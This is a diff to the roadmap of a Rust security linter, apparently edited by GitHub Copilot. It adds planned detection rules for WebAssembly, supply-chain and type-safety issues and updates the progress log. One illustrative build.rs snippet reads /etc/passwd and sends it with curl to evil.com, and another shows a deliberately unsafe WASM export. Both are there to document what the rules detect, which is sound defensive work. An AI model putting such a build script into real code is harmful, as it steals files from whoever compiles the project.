@@ -200,6 +200,72 @@ All artifacts generated on every run:
 - Identify FFI boundaries via `extern "C"` functions
 - Track lock guard lifetimes and potential panic points
 
+### 2.4 WebAssembly-Specific Vulnerabilities (Medium Priority)
+
+As Rust becomes the primary language for WebAssembly, new vulnerability classes emerge:
+
+| Rule ID | Name | Risk | Status |
+|---------|------|------|--------|
+| RUSTCOLA103 | Linear memory out-of-bounds | Memory corruption | ❌ To implement |
+| NEW | Host function trust assumptions | Data injection | ❌ To implement |
+| NEW | Component model capability leaks | Privilege escalation | ❌ To implement |
+
+**Example - Linear Memory OOB:**
+```rust
+// VULNERABLE in WASM: No memory protection
+#[no_mangle]
+pub extern "C" fn process(ptr: *mut u8, len: usize) {
+    unsafe {
+        // In WASM, this can access any linear memory!
+        std::slice::from_raw_parts_mut(ptr, len);
+    }
+}
+```
+
+**Implementation Notes:**
+- Requires WASM-specific analysis mode
+- Focus on `#[no_mangle]` exports and `extern "C"` FFI boundaries
+- Consider `wasm_bindgen` and WASI patterns
+
+### 2.5 Macro Hygiene & Supply Chain (Low Priority)
+
+Procedural macros execute at compile time, creating supply chain attack vectors:
+
+| Rule ID | Name | Risk | Status |
+|---------|------|------|--------|
+| RUSTCOLA097 | Build script network access | Supply chain | ✅ Complete |
+| RUSTCOLA102 | Proc-macro side effects | Supply chain | ❌ To implement |
+| NEW | Proc-macro filesystem access | Supply chain | ❌ To implement |
+
+**Example - Build Script Attack:**
+```rust
+// build.rs - runs at compile time
+fn main() {
+    std::fs::read_to_string("/etc/passwd");  // Supply chain attack
+    std::process::Command::new("curl")
+        .args(&["-d", "@/etc/passwd", "http://evil.com"])
+        .spawn();
+}
+```
+
+**Implementation Notes:**
+- Source-level scan of `build.rs` for network/filesystem/process APIs
+- Audit proc-macro dependencies for suspicious patterns
+- Consider integration with cargo-vet/cargo-crev
+
+### 2.6 Interior Mutability & Type Safety (Low Priority)
+
+| Rule ID | Name | Risk | Status |
+|---------|------|------|--------|
+| RUSTCOLA100 | OnceCell TOCTOU race | Data corruption | ❌ To implement |
+| NEW | UnsafeCell aliasing violation | UB | ❌ To implement |
+| NEW | Lazy initialization panic poison | DoS | ❌ To implement |
+| RUSTCOLA101 | Variance transmute unsound | Type confusion | ❌ To implement |
+
+**Implementation Notes:**
+- Requires HIR analysis for type variance
+- Focus on `unsafe` blocks with `UnsafeCell`, `OnceCell`, `Lazy`
+
 ---
 
 ## Phase 3: Precision & Recall Improvements
@@ -305,8 +371,8 @@ All artifacts generated on every run:
 ## Release Criteria for v1.0.0 RC
 
 ### Must Have (Blocking)
-- [ ] All tests passing (0 failures)
-- [ ] All rules migrated to modules (lib.rs < 5K LOC infrastructure only)
+- [x] All tests passing (0 failures) ✅ 146/146
+- [x] All rules migrated to modules (lib.rs < 5K LOC infrastructure only) ✅ 5,542 LOC
 - [ ] Async correctness rules implemented (4+ new rules)
 - [ ] Field-sensitive taint analysis operational
 - [ ] SARIF output includes code snippets and severity
@@ -339,6 +405,26 @@ All artifacts generated on every run:
 
 ---
 
+## Future Rule ID Assignments
+
+Reserved rule IDs for planned rules (from GAP-ANALYSIS-RUST-SPECIFIC.md):
+
+| Rule ID | Name | Category | Priority |
+|---------|------|----------|----------|
+| RUSTCOLA093 | `blocking-in-async-context` | Async | High |
+| RUSTCOLA094 | `mutex-guard-across-await` | Async | High |
+| RUSTCOLA095 | `transmute-lifetime-change` | Memory | High ✅ |
+| RUSTCOLA096 | `raw-pointer-from-reference-escape` | Memory | High ✅ |
+| RUSTCOLA097 | `build-script-network-access` | Supply Chain | High ✅ |
+| RUSTCOLA098 | `panic-unsafe-invariant` | Panic Safety | Medium |
+| RUSTCOLA099 | `catch-unwind-mutable-reference` | Panic Safety | Medium |
+| RUSTCOLA100 | `oncecell-toctou` | Interior Mutability | Medium |
+| RUSTCOLA101 | `variance-transmute-unsound` | Type Safety | Low |
+| RUSTCOLA102 | `proc-macro-side-effects` | Supply Chain | Low |
+| RUSTCOLA103 | `wasm-linear-memory-oob` | WebAssembly | Medium |
+
+---
+
 ## Timeline Estimate
 
 | Phase | Duration | Cumulative |
@@ -353,26 +439,33 @@ All artifacts generated on every run:
 
 ## Progress Log
 
-### v0.7.2 (Current)
-- ✅ **Phase 1.1 COMPLETE:** All 146 tests passing
-- 🔄 **Phase 1.2 IN PROGRESS:** Rule migration to modules
-  - Created `rules/utils.rs` with shared utilities (`strip_string_literals`, `strip_comments`, `command_rule_should_skip`, `LOG_SINK_PATTERNS`, `INPUT_SOURCE_PATTERNS`)
-  - Migrated `UnsafeSendSyncBoundsRule` (RUSTCOLA015) → `concurrency.rs`
-  - Migrated `FfiBufferLeakRule` (RUSTCOLA016) → `ffi.rs`
-  - Migrated `OverscopedAllowRule` (RUSTCOLA072) → `code_quality.rs`
-  - Migrated `CommentedOutCodeRule` (RUSTCOLA092) → `code_quality.rs`
-  - Migrated `UnderscoreLockGuardRule`, `BroadcastUnsyncPayloadRule`, `PanicInDropRule`, `UnwrapInPollRule` → `concurrency.rs`
-  - Migrated `UntrustedEnvInputRule` (RUSTCOLA006) → `injection.rs`
-  - Migrated `CommandInjectionRiskRule` (RUSTCOLA007) → `injection.rs`
-  - Migrated `CommandArgConcatenationRule` (RUSTCOLA031) → `injection.rs`
-  - Migrated `LogInjectionRule` (RUSTCOLA076) → `injection.rs`
-  - **lib.rs reduced:** 22,936 → 20,666 lines (~9.9% reduction)
-  - **Remaining:** ~17 rules (6 injection, 11 memory)
+### v0.7.5 (Current)
+- ✅ **Phase 1.3 COMPLETE:** All security rules modularized
+  - Migrated 8 memory rules → `memory.rs`: StaticMutGlobalRule, TransmuteLifetimeChangeRule, RawPointerEscapeRule, VecSetLenMisuseRule, LengthTruncationCastRule, MaybeUninitAssumeInitDataflowRule, SliceElementSizeMismatchRule, SliceFromRawPartsRule
+  - Migrated `ContentLengthAllocationRule` → `web.rs`
+  - Migrated `UnboundedAllocationRule` → `resource.rs`
+  - Migrated `SerdeLengthMismatchRule` → `input.rs`
+  - Removed duplicate `AllocatorMismatchRule`
+  - Moved `filter_entry` helper → `utils.rs`
+  - **lib.rs reduced:** 8,253 → 5,542 lines (68% total reduction from 17,360)
+  - **Only infrastructure rules remain:** SuppressionRule, DeclarativeRule
+  - **Tests:** 146 passed
+
+### v0.7.2-v0.7.4
+- ✅ **Phase 1.2 COMPLETE:** Duplicate rules cleanup
+  - Removed 64 duplicate rules from lib.rs
+  - Migrated injection rules → `injection.rs` (10 rules)
+  - **lib.rs reduced:** 17,360 → 8,253 lines (52% reduction)
+
+### v0.7.1
+- ✅ Created `rules/utils.rs` with shared utilities
+- ✅ Migrated 8 rules to modules (concurrency.rs, ffi.rs, code_quality.rs)
+- **lib.rs reduced:** 22,936 → 21,236 lines
 
 ### Next Steps
-1. **Immediate:** Continue Phase 1.2 - Migrate remaining 17 rules
-2. **This Week:** Complete Phase 1.2 - Target lib.rs < 15K LOC
-3. **Next Sprint:** Start Phase 2.1 - Async correctness rules
+1. **Ready:** Phase 1 COMPLETE - lib.rs at 5,542 lines (infrastructure only)
+2. **Next:** Start Phase 2.1 - Async correctness rules (RUSTCOLA093, RUSTCOLA094)
+3. **Upcoming:** Phase 3.1 - Field-sensitive taint analysis
 
 ---
 
@@ -382,3 +475,4 @@ All artifacts generated on every run:
 |------|---------|--------|---------|
 | 2025-12-14 | 1.0 | GitHub Copilot | Initial production release plan |
 | 2025-12-14 | 1.1 | GitHub Copilot | Updated for v0.7.2, Phase 1.1 complete |
+| 2025-12-14 | 1.2 | GitHub Copilot | v0.7.5: Phase 1.3 complete, added WebAssembly/Macro sections, future rule IDs |
